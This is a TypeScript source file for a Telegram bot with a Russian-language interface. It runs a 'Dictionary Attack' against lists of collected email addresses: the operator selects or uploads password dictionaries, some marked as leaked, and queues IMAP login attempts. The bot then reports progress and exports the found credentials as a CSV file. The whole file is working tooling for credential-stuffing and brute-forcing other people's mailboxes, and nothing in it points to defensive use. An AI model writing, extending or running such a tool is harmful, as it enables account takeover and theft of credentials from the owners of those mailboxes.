import { InlineKeyboard, InputFile, Api } from "grammy";
import IORedis from "ioredis";
import { db } from "../../services/db.js";
import { matchingQueue } from "../../services/queue.js";
import { getDictionaries, createDictionary } from "../../services/dictionary/manager.js";
import { parsePasswordFile } from "../../services/dictionary/parser.js";
import { exportRecoveredCredentials } from "../../services/matching/recovered-credentials.js";
import { trackTask } from "../../services/telegram/task-tracker.js";
import { renderProgressBar } from "../../services/progress.js";
import { audit } from "../../services/audit.js";
import { config } from "../../config.js";
import type { BotContext } from "../types.js";

const CATEGORY_ICONS: Record<string, string> = {
  common: "📗",
  user_specific: "📘",
  leaked: "📕",
};

export async function handleRpwCallback(ctx: BotContext) {
  const data = ctx.callbackQuery?.data;
  if (!data?.startsWith("rpw:")) return;

  const parts = data.split(":");
  const action = parts[1];

  switch (action) {
    case "task":
      return selectTask(ctx, Number(parts[2]));
    case "dict":
      return handleDictSelect(ctx, parts[2]);
    case "upload":
      return awaitUpload(ctx);
    case "confirm":
      return showConfirmation(ctx);
    case "start":
      return startAttack(ctx);
    case "progress":
      return showProgress(ctx);
    case "stop":
      return stopAttack(ctx);
    case "results":
      return sendResults(ctx);
    case "back":
      return backToMenu(ctx);
    default:
      await ctx.answerCallbackQuery();
  }
}

async function selectTask(ctx: BotContext, taskId: number) {
  (ctx.session as any).rpwTaskId = taskId;
  (ctx.session as any).rpwDictIds = [];

  return showDictMenu(ctx);
}

async function showDictMenu(ctx: BotContext) {
  const dictIds: number[] = (ctx.session as any).rpwDictIds ?? [];
  const dictionaries = await getDictionaries(ctx.dbUser.id);
  const selectedSet = new Set(dictIds);

  if (dictionaries.length === 0) {
    const kb = new InlineKeyboard()
      .text("📂 Загрузить словарь", "rpw:upload")
      .row()
      .text("« Назад", "rpw:back");

    await ctx.answerCallbackQuery();
    await ctx.editMessageText(
      "📖 Нет словарей. Загрузите файл с паролями:",
      { reply_markup: kb },
    );
    return;
  }

  const kb = new InlineKeyboard();

  // Group by category
  const byCategory = new Map<string, typeof dictionaries>();
  for (const d of dictionaries) {
    const list = byCategory.get(d.category) ?? [];
    list.push(d);
    byCategory.set(d.category, list);
  }

  for (const [category, dicts] of byCategory) {
    const icon = CATEGORY_ICONS[category] ?? "📖";
    for (const d of dicts.slice(0, 5)) {
      const mark = selectedSet.has(d.id) ? "☑️" : "☐";
      kb.text(`${mark} ${icon} ${d.name} (${d.entryCount})`, `rpw:dict:${d.id}`).row();
    }
  }

  kb.text("📂 Загрузить свой", "rpw:upload").row();
  kb.text(`▶ Далее (${dictIds.length} выбрано)`, "rpw:confirm").row();

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "🔑 <b>Выберите словари</b>\n\n" +
      "Нажмите для toggle. Можно загрузить свой TXT файл.",
    { parse_mode: "HTML", reply_markup: kb },
  );
}

async function handleDictSelect(ctx: BotContext, sub: string) {
  const dictIds: number[] = (ctx.session as any).rpwDictIds ?? [];
  const dictId = Number(sub);

  const idx = dictIds.indexOf(dictId);
  if (idx >= 0) dictIds.splice(idx, 1);
  else dictIds.push(dictId);
  (ctx.session as any).rpwDictIds = dictIds;

  return showDictMenu(ctx);
}

async function awaitUpload(ctx: BotContext) {
  (ctx.session as any).rpwAwaitingFile = true;

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    "📂 Отправьте .txt файл с паролями (один на строку).\n\n" +
      "Файл будет сохранён как словарь и добавлен к выбранным.",
  );
}

async function showConfirmation(ctx: BotContext) {
  const taskId = (ctx.session as any).rpwTaskId as number;
  const dictIds = (ctx.session as any).rpwDictIds as number[];

  if (!taskId || !dictIds || dictIds.length === 0) {
    await ctx.answerCallbackQuery("Выберите задачу и минимум 1 словарь");
    return;
  }

  const emailCount = await db.email.count({
    where: { taskId, status: "MX_FOUND" },
  });

  let totalPasswords = 0;
  for (const dictId of dictIds) {
    totalPasswords += await db.dictionaryPassword.count({
      where: { dictionaryId: dictId },
    });
  }

  const kb = new InlineKeyboard()
    .text("▶ Запустить Dictionary Attack", "rpw:start")
    .row()
    .text("« Изменить словари", "rpw:dict:menu");

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    `🔑 <b>Подтверждение</b>\n\n` +
      `📧 Email'ов: ${emailCount}\n` +
      `📖 Словарей: ${dictIds.length}\n` +
      `🔑 Паролей: ${totalPasswords}\n` +
      `🔄 Комбинаций: ${emailCount * totalPasswords}\n\n` +
      `Нажмите для запуска:`,
    { parse_mode: "HTML", reply_markup: kb },
  );
}

async function startAttack(ctx: BotContext) {
  const taskId = (ctx.session as any).rpwTaskId as number;
  const dictIds = (ctx.session as any).rpwDictIds as number[];
  const chatId = ctx.chat!.id;
  const msgId = ctx.callbackQuery?.message?.message_id;

  await matchingQueue.add(`rpw-${taskId}-${Date.now()}`, {
    userId: ctx.dbUser.id,
    taskId,
    dictionaryIds: dictIds,
    method: "imap",
    chatId: chatId.toString(),
  });

  await trackTask(taskId, BigInt(chatId), "dictionary_attack", msgId).catch(() => {});

  audit({
    userId: ctx.dbUser.id,
    type: "dictionary_attack_started",
    level: "INFO",
    message: `Dictionary attack: task #${taskId}, ${dictIds.length} dicts`,
  });

  const kb = new InlineKeyboard()
    .text("🔄 Обновить", "rpw:progress")
    .text("⏹ Стоп", "rpw:stop");

  await ctx.answerCallbackQuery("Dictionary Attack запущен");
  await ctx.editMessageText(
    `⏳ <b>Dictionary Attack запущен</b>\n\n` +
      `📧 Email: 0 / ?\n` +
      `🔑 Password: 0 / ?\n` +
      renderProgressBar(0, 1) + "\n\n" +
      `✅ Найдено: 0`,
    { parse_mode: "HTML", reply_markup: kb },
  );
}

async function showProgress(ctx: BotContext) {
  const taskId = (ctx.session as any).rpwTaskId;

  // Get matching progress from Redis
  const redis = new IORedis(config.redis.url);
  const raw = await redis.get(`matching-result:${ctx.dbUser.id}:${taskId}`);
  redis.disconnect();

  // Get task status
  const task = taskId
    ? await db.task.findUnique({ where: { id: taskId } })
    : null;

  // Get match stats
  const stats = await db.credentialMatch.groupBy({
    by: ["status"],
    where: { userId: ctx.dbUser.id },
    _count: true,
  });

  const found = stats.find((s) => s.status === "found")?._count ?? 0;
  const notFound = stats.find((s) => s.status === "not_found")?._count ?? 0;
  const total = found + notFound;

  if (raw || (task?.status === "COMPLETED")) {
    const kb = new InlineKeyboard()
      .text("📥 Скачать результаты", "rpw:results");

    await ctx.answerCallbackQuery("Завершено");
    await ctx.editMessageText(
      `✅ <b>Dictionary Attack завершён</b>\n\n` +
        `📧 Проверено: ${total}\n` +
        `✅ Найдено: ${found}\n` +
        `❌ Не найдено: ${notFound}`,
      { parse_mode: "HTML", reply_markup: kb },
    );
    return;
  }

  const kb = new InlineKeyboard()
    .text("🔄 Обновить", "rpw:progress")
    .text("⏹ Стоп", "rpw:stop");

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    `⏳ <b>Dictionary Attack</b>\n\n` +
      `📧 Email: ${total} проверено\n` +
      `✅ Найдено: ${found}\n` +
      `❌ Не найдено: ${notFound}\n\n` +
      `Обработка продолжается...`,
    { parse_mode: "HTML", reply_markup: kb },
  );
}

async function stopAttack(ctx: BotContext) {
  const taskId = (ctx.session as any).rpwTaskId;
  if (taskId) {
    await db.task.update({
      where: { id: taskId },
      data: { status: "CANCELLED" },
    }).catch(() => {});
  }

  audit({
    userId: ctx.dbUser.id,
    type: "dictionary_attack_stopped",
    level: "WARNING",
    message: `Dictionary attack stopped: task #${taskId}`,
  });

  await ctx.answerCallbackQuery("Атака остановлена");
  await ctx.editMessageText(
    "🚫 <b>Dictionary Attack остановлен</b>",
    { parse_mode: "HTML" },
  );
}

async function sendResults(ctx: BotContext) {
  const buffer = await exportRecoveredCredentials(ctx.dbUser.id, "csv");

  if (buffer.length === 0) {
    await ctx.answerCallbackQuery("Нет результатов");
    return;
  }

  await ctx.replyWithDocument(
    new InputFile(buffer, `dictionary_attack_${Date.now()}.csv`),
    { caption: "🔑 Dictionary Attack Results (CSV)" },
  );
  await ctx.answerCallbackQuery();
}

async function backToMenu(ctx: BotContext) {
  const { mainMenuKeyboard } = await import("../keyboards/main-menu.js");
  await ctx.answerCallbackQuery();
  await ctx.editMessageText("Выберите действие:", {
    reply_markup: mainMenuKeyboard(ctx.dbUser.role, ctx.dbUser.isAdmin),
  });
}

export async function handleRpwFileUpload(ctx: BotContext): Promise<boolean> {
  if (!(ctx.session as any).rpwAwaitingFile) return false;

  const doc = ctx.message?.document;
  if (!doc || !doc.file_name?.endsWith(".txt")) {
    await ctx.reply("Отправьте .txt файл.");
    return true;
  }

  (ctx.session as any).rpwAwaitingFile = false;

  const api = new Api(config.botToken);
  const file = await api.getFile(doc.file_id);
  const url = `https://api.telegram.org/file/bot${config.botToken}/${file.file_path}`;
  const response = await fetch(url);
  const content = await response.text();

  const parsed = parsePasswordFile(content);
  if (parsed.entries.length === 0) {
    await ctx.reply("Файл пуст или нет валидных паролей.");
    return true;
  }

  const name = doc.file_name.replace(".txt", "");
  const dict = await createDictionary(
    ctx.dbUser.id,
    name,
    "common",
    parsed.entries,
    doc.file_name,
  );

  // Add to selected dictionaries
  const dictIds: number[] = (ctx.session as any).rpwDictIds ?? [];
  dictIds.push(dict.id);
  (ctx.session as any).rpwDictIds = dictIds;

  await ctx.reply(
    `✅ Словарь "${name}" загружен: ${dict.entryCount} паролей.\nДобавлен к выбранным.`,
  );

  return true;
}
